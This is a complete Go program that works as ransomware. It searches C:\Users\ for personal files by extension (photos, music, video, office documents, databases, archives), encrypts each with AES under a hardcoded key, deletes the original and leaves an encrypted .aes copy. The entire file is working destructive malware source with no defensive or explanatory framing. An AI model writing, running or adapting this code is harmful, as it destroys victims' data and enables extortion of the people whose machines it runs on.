package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
)

func search() ([]string, error) {
	dir := "C:\\Users\\"
	extensions := []string{

		// "exe,", "dll", "so", "rpm", "deb", "vmlinuz", "img",  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
		"jpg", "jpeg", "bmp", "gif", "png", "svg", "psd", "raw", // images
		"mp3", "mp4", "m4a", "aac", "ogg", "flac", "wav", "wma", "aiff", "ape", // music and sound
		"avi", "flv", "m4v", "mkv", "mov", "mpg", "mpeg", "wmv", "swf", "3gp", // Video and movies

		"doc", "docx", "xls", "xlsx", "ppt", "pptx", // Microsoft office
		"odt", "odp", "ods", "txt", "rtf", "tex", "pdf", "epub", "md", // OpenOffice, Adobe, Latex, Markdown, etc
		//"yml", "yaml", "json", "xml", "csv", // structured data
		"db", "sql", "dbf", "mdb", "iso", // databases and disc images

		//"html", "htm", "xhtml", "php", "asp", "aspx", "js", "jsp", "css", // web technologies
		//"c", "cpp", "cxx", "h", "hpp", "hxx", // C source code
		//"java", "class", "jar", // java source code
		//"ps", "bat", "vb", // windows based scripts
		//"awk", "sh", "cgi", "pl", "ada", "swift", // linux/mac based scripts
		//"go", "py", "pyc", "bf", "coffee", // other source code files

		"zip", "tar", "tgz", "bz2", "7z", "rar", "bak", // compressed formats

	}

	fileList := make([]string, 0)
	e := filepath.Walk(dir, func(path string, f os.FileInfo, e error) error {
		for _, ext := range extensions {
			file := strings.Split(path, ".")
			if strings.EqualFold(file[len(file)-1], ext) {
				fileList = append(fileList, path)
			}
		}
		return e
	})

	if e != nil {
		panic(e)
	}

	return fileList, nil
}

func encrypt(plainstring string) string {
	// Byte array of the string
	plaintext := []byte(plainstring)

	// Key
	key := []byte("aserejejadejedej")

	// Create the AES cipher
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	// Empty array of 16 + plaintext length
	// Include the IV at the beginning
	ciphertext := make([]byte, aes.BlockSize+len(plaintext))

	// Slice of first 16 bytes
	iv := ciphertext[:aes.BlockSize]

	// Write 16 rand bytes to fill iv
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		panic(err)
	}

	// Return an encrypted stream
	stream := cipher.NewCFBEncrypter(block, iv)

	// Encrypt bytes from plaintext to ciphertext
	stream.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)

	return string(ciphertext)
}

func writeToFile(data, file string) {
	ioutil.WriteFile(file+".aes", []byte(data), 777)
}

func readFromFile(file string) ([]byte, error) {
	data, err := ioutil.ReadFile(file)
	return data, err
}

func deleteFile(file string) error {
	err := os.Remove(file)
	return err
}

func main() {

	files, e := search()
	if e != nil {
		panic(e)
	}

	for _, file := range files {
		readed, e := readFromFile(file)
		if e != nil {
			panic(e)
		}
		encrypted := encrypt(string(readed))
		deleteFile(file)

		writeToFile(encrypted, file)
		fmt.Println("Crifrado")
	}
}
